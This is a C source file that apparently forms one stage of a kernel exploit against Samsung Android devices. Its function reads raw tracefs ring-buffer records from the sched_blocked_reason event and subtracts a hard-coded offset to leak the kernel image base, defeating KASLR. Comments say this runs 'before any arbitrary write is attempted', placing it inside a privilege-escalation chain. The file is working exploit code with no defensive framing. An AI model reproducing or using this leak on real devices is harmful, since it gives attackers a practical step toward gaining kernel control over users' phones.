#include "common.h"

/* Samsung's shell route discovers the image slide through the read-only
 * tracefs record, before any arbitrary write is attempted.  Keep this
 * separate from the removed APK-only boot-id/pselect calibration code. */
static int tracefs_write_str(const char *path, const char *s) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  size_t len = strlen(s);
  ssize_t w = write(fd, s, len);
  close(fd);
  return w == (ssize_t)len;
}

int tracefs_leak_kernel_base(uint64_t *out) {
  if (!out) {
    return 0;
  }
  uint32_t event_id_want =
    (active_offsets && active_offsets->tracefs_event_id)
      ? active_offsets->tracefs_event_id : 106;
  uint64_t caller_off =
    (active_offsets && active_offsets->tracefs_caller_off)
      ? active_offsets->tracefs_caller_off : 0xdb1a0ULL;

  /* Stop -> enable -> start -> truncate -> sleep -> stop. */
  if (!tracefs_write_str("/sys/kernel/tracing/tracing_on", "0")) {
    pr_warning("tracefs leak: tracing_on write failed (perm?)\n");
    return 0;
  }
  if (!tracefs_write_str(
        "/sys/kernel/tracing/events/sched/sched_blocked_reason/enable",
        "1")) {
    pr_warning("tracefs leak: event enable write failed (perm?)\n");
    return 0;
  }
  if (!tracefs_write_str("/sys/kernel/tracing/tracing_on", "1")) {
    pr_warning("tracefs leak: tracing restart failed\n");
    return 0;
  }
  int tfd = open("/sys/kernel/tracing/trace", O_WRONLY | O_TRUNC | O_CLOEXEC);
  if (tfd >= 0) {
    close(tfd);
  }
  sleep(1);
  tracefs_write_str("/sys/kernel/tracing/tracing_on", "0");

  int found = 0;
  uint64_t result = 0;
  long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
  for (int cpu = 0; cpu < ncpu && !found; cpu++) {
    char path[128];
    snprintf(path, sizeof(path),
             "/sys/kernel/tracing/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0) {
      continue;
    }
    unsigned char buf[4096];
    ssize_t n;
    while (!found && (n = read(fd, buf, sizeof(buf))) > 0) {
      if (n < 0x14) {
        continue;
      }
      /* Raw page: +0 timestamp, +8 commit, records from +0x10. */
      uint64_t commit = *(uint64_t *)(buf + 8) & 0xfff;
      uint64_t end = commit + 0x10;
      if (end > (uint64_t)n) {
        end = (uint64_t)n;
      }
      if (commit < 4) {
        continue;
      }
      size_t hdr = 0x10;
      size_t pay = 0x14;
      while (pay <= end) {
        uint32_t type_len = *(uint32_t *)(buf + hdr) & 0x1f;
        if (type_len == 0) {
          hdr = pay;
        } else if (type_len == 0x1f) {
          hdr += 0xc;
        } else if (type_len == 0x1e) {
          hdr += 8;
        } else {
          size_t rec_end = pay + (size_t)type_len * 4;
          if (type_len > 0x1c || rec_end > end) {
            break;
          }
          hdr = rec_end;
          if (type_len >= 6) {
            uint16_t event_id = *(uint16_t *)(buf + pay);
            if (event_id == event_id_want) {
              uint64_t caller = *(uint64_t *)(buf + pay + 0x10);
              uint64_t base = caller - caller_off;
              if (caller >= 0xffff000000000000ULL &&
                  base >= KIMAGE_TEXT_BASE &&
                  (base & 0xffff) == 0) {
                result = base;
                found = 1;
                break;
              }
            }
          }
        }
        pay = hdr + 4;
      }
    }
    close(fd);
  }
  tracefs_write_str(
    "/sys/kernel/tracing/events/sched/sched_blocked_reason/enable", "0");
  if (!found) {
    pr_warning("tracefs leak: no sched_blocked_reason record on any cpu\n");
    return 0;
  }
  if (result < KIMAGE_TEXT_BASE ||
      result - KIMAGE_TEXT_BASE > 0x1f0000ULL) {
    pr_warning("tracefs leak: implausible base=%016llx\n",
               (unsigned long long)result);
    return 0;
  }
  *out = result;
  return 1;
}
